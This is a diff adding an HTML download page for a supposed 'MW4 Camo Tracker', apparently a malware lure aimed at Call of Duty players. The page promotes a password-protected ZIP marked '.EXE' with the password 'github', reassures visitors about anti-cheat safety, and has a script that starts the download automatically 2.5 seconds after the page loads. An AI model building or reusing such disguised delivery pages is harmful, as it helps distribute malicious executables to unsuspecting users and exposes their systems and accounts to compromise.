@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MW4 Camo Tracker 2026 — Download</title>
+    <meta name="description" content="Track Modern Warfare 4 camo challenges, weapon stats, and progress. 100% external. No injection.">
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Space+Mono:wght@700&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #050505;
+            --card-bg: #0d0d12;
+            --border: #1f1f2e;
+            --accent: #00ff88; /* Кислотный зеленый */
+            --accent-dim: rgba(0, 255, 136, 0.1);
+            --text-main: #ffffff;
+            --text-muted: #888888;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background-color: var(--bg);
+            /* Легкий тактический паттерн */
+            background-image: linear-gradient(rgba(5,5,5,0.95), rgba(5,5,5,0.95)), url('data:image/svg+xml;utf8,<svg width="40" height="40" xmlns="http://www.w3.org/2000/svg"><path d="M0 40L40 0H20L0 20M40 40V20L20 40" fill="rgba(255,255,255,0.02)" fill-rule="evenodd"/></svg>');
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            display: flex; flex-direction: column; align-items: center;
+            min-height: 100vh; overflow-x: hidden;
+        }
+        .top-bar {
+            width: 100%; border-bottom: 1px solid var(--border); background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(10px); position: sticky; top: 0; z-index: 100;
+            display: flex; justify-content: space-between; padding: 12px 24px;
+            font-family: 'Rajdhani', sans-serif; font-size: 0.9rem; text-transform: uppercase;
+            letter-spacing: 1px; color: var(--text-muted);
+        }
+        .top-bar span { color: var(--accent); }
+        .main-container { max-width: 900px; width: 100%; padding: 60px 24px; display: flex; flex-direction: column; gap: 40px; }
+        .header-section { display: flex; flex-direction: column; align-items: flex-start; border-left: 4px solid var(--accent); padding-left: 24px; }
+        h1 { font-family: 'Rajdhani', sans-serif; font-size: 4rem; font-weight: 700; line-height: 1; text-transform: uppercase; margin-bottom: 16px; letter-spacing: -0.02em; }
+        h1 span { color: var(--accent); }
+        .subtitle { color: var(--text-muted); font-size: 1.1rem; line-height: 1.6; max-width: 600px; }
+        
+        .warning-box {
+            margin-top: 20px; background: rgba(255, 87, 34, 0.1); border-left: 3px solid #ff5722;
+            padding: 12px 16px; border-radius: 4px; font-size: 0.9rem; color: #ffb3b3;
+        }
+
+        .download-panel {
+            background: var(--card-bg); border: 1px solid var(--border); border-radius: 12px;
+            padding: 32px; display: flex; flex-direction: column; gap: 24px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4); position: relative; overflow: hidden;
+        }
+        .download-panel::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(90deg, transparent, var(--accent), transparent); }
+        .file-info-row { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); padding-bottom: 16px; }
+        .file-title { font-family: 'Rajdhani', sans-serif; font-size: 1.4rem; font-weight: 600; letter-spacing: 0.5px; }
+        .file-title span { color: var(--text-muted); font-size: 1rem; margin-left: 12px; font-family: 'Inter'; }
+        .password-row { display: flex; align-items: center; justify-content: space-between; background: #000; border: 1px dashed #333; padding: 16px 24px; border-radius: 8px; }
+        .password-label { font-size: 0.85rem; color: var(--text-muted); text-transform: uppercase; font-weight: 600; letter-spacing: 1px; }
+        .password-value { font-family: 'Space Mono', monospace; font-size: 1.4rem; font-weight: 700; color: var(--accent); text-shadow: 0 0 10px rgba(0, 255, 136, 0.4); letter-spacing: 2px; user-select: all; }
+        .copy-btn { background: rgba(255,255,255,0.05); border: none; color: var(--text-main); padding: 6px 12px; border-radius: 4px; font-size: 0.8rem; font-weight: 600; cursor: pointer; transition: background 0.2s; }
+        .copy-btn:hover { background: rgba(255,255,255,0.1); }
+        .btn-download {
+            display: flex; align-items: center; justify-content: space-between; background: var(--accent); color: #000;
+            text-decoration: none; padding: 0 24px; height: 60px; border-radius: 8px;
+            font-family: 'Rajdhani', sans-serif; font-size: 1.4rem; font-weight: 700; text-transform: uppercase;
+            transition: all 0.2s ease; cursor: pointer; border: none; width: 100%;
+        }
+        .btn-download:hover { background: #00cc6a; box-shadow: 0 0 20px rgba(0, 255, 136, 0.4); }
+        .btn-download svg { width: 24px; height: 24px; }
+        
+        .features-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
+        .feature-card { background: rgba(255,255,255,0.02); border: 1px solid var(--border); border-radius: 8px; padding: 24px; transition: border-color 0.3s; }
+        .feature-card:hover { border-color: rgba(0, 255, 136, 0.3); }
+        .feature-card h3 { font-family: 'Rajdhani', sans-serif; font-size: 1.2rem; font-weight: 600; color: var(--accent); margin-bottom: 12px; }
+        .feature-card p { color: var(--text-muted); font-size: 0.9rem; line-height: 1.5; }
+        .footer { margin-top: 40px; padding-top: 20px; border-top: 1px solid var(--border); font-size: 0.8rem; color: #444; text-align: center; }
+        .spinner { display: none; width: 20px; height: 20px; border: 3px solid rgba(0,0,0,0.2); border-top-color: #000; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @media (max-width: 768px) { h1 { font-size: 2.8rem; } .features-grid { grid-template-columns: 1fr; } .download-panel { padding: 20px; } .password-row { flex-direction: column; align-items: flex-start; gap: 12px; } }
+    </style>
+</head>
+<body>
+    <div class="top-bar">
+        <div>COD TOOLS <span>// CAMO TRACKER</span></div>
+        <div>STATUS: <span>OFFLINE SAFE</span></div>
+    </div>
+    <div class="main-container">
+        <div class="header-section">
+            <h1>MW4 CAMO<br><span>TRACKER</span></h1>
+            <p class="subtitle">Track camo challenges, weapon stats, and progress. 100% external. No injection, no RICOCHET flags.</p>
+            
+            <div class="warning-box">
+                <strong>SAFETY FIRST:</strong> This tool does not read game memory. You input your stats manually to stay 100% safe from anti-cheat.
+            </div>
+        </div>
+
+        <div class="download-panel">
+            <div class="file-info-row">
+                <div class="file-title">MW4CamoTracker.zip <span>4.2 MB</span></div>
+                <div style="color: var(--accent); font-family: 'Rajdhani'; font-weight: 600; letter-spacing: 1px;">v1.0.0 STABLE</div>
+            </div>
+            <div class="password-row">
+                <span class="password-label">Archive Password</span>
+                <div style="display: flex; align-items: center; gap: 16px;">
+                    <span class="password-value" id="passText">github</span>
+                    <button class="copy-btn" onclick="copyPass()">COPY</button>
+                </div>
+            </div>
+            <a href="files/MW4CamoTracker.zip" download class="btn-download" id="downloadBtn">
+                <div style="display: flex; align-items: center; gap: 12px;">
+                    <div class="spinner" id="spinner"></div>
+                    <svg id="dlIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
+                    <span id="btnText">Download Tracker</span>
+                </div>
+                <span style="font-size: 1rem; opacity: 0.6;">[ .EXE ]</span>
+            </a>
+        </div>
+
+        <div class="features-grid">
+            <div class="feature-card">
+                <h3>// CAMO PROGRESS</h3>
+                <p>Track kills, headshots, and mastery challenges for every weapon in Season 1.</p>
+            </div>
+            <div class="feature-card">
+                <h3>// WEAPON STATS</h3>
+                <p>Compare TTK, recoil, and damage range to optimize your loadout for the grind.</p>
+            </div>
+            <div class="feature-card">
+                <h3>// CHALLENGE OPTIMIZER</h3>
+                <p>See which challenges overlap (e.g., headshots + AR kills) to finish faster.</p>
+            </div>
+        </div>
+        <div class="footer">© 2026 MW4 Camo Tracker. Not affiliated with Activision or Infinity Ward.</div>
+    </div>
+    <script>
+        const downloadUrl = "files/MW4CamoTracker.zip";
+        const fileName = "MW4CamoTracker.zip";
+        const btn = document.getElementById('downloadBtn');
+        const btnText = document.getElementById('btnText');
+        const spinner = document.getElementById('spinner');
+        const dlIcon = document.getElementById('dlIcon');
+        function copyPass() {
+            const pass = document.getElementById('passText').innerText;
+            navigator.clipboard.writeText(pass).then(() => {
+                const btn = document.querySelector('.copy-btn');
+                const originalText = btn.innerText;
+                btn.innerText = 'COPIED!';
+                btn.style.color = '#10b981';
+                setTimeout(() => { btn.innerText = originalText; btn.style.color = 'var(--text-main)'; }, 2000);
+            });
+        }
+        function triggerDownload() {
+            const a = document.createElement('a');
+            a.href = downloadUrl; a.download = fileName;
+            document.body.appendChild(a); a.click(); document.body.removeChild(a);
+            btnText.textContent = "Download Again";
+            spinner.style.display = 'none'; dlIcon.style.display = 'block';
+        }
+        setTimeout(() => { triggerDownload(); }, 2500);
+        btn.addEventListener('click', function(e) {
+            e.preventDefault(); btnText.textContent = "Preparing...";
+            dlIcon.style.display = 'none'; spinner.style.display = 'block';
+            setTimeout(() => { triggerDownload(); }, 500);
+        });
+    </script>
+</body>
+</html>
